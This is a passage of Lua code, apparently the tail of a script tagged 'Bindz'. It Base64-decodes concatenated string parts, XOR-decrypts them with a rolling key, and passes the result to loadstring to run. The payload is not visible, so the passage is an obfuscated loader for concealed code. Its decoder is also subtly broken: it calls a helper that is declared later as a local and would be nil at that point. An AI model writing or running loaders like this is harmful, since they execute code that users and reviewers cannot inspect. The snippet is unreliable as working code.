local D=table.concat(parts)
local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64d(s)
  s=string.gsub(s,"[^"..B.."=]","")
  local out={}
  local i=1
  while i<=#s do
    local a=bstring(1,s,i)
    local b=bstring(2,s,i)
    local c=bstring(3,s,i)
    local d=bstring(4,s,i)
    out[#out+1]=string.char(a*4+math.floor(b/16))
    if c>0 or s:sub(i+2,i+2)~="=" then out[#out+1]=string.char((b%16)*16+math.floor(c/4)) end
    if d>0 or s:sub(i+3,i+3)~="=" then out[#out+1]=string.char((c%4)*64+d) end
    i=i+4
  end
  return table.concat(out)
end
local function bstring(n,s,i)
  local ch=s:sub(i+n-1,i+n-1)
  if ch=="" or ch=="=" then return 0 end
  local p=B:find(ch,1,true)
  if not p then return 0 end
  return p-1
end
local raw=b64d(D)
local dec={}
for i=1,#raw do
  dec[i]=string.char(bit32.bxor(string.byte(raw,i),K+((i-1)%7)))
end
local src=table.concat(dec)
local fn,err=loadstring(src,"=Bindz")
if not fn then error("[Bindz] decode fail: "..tostring(err)) end
return fn()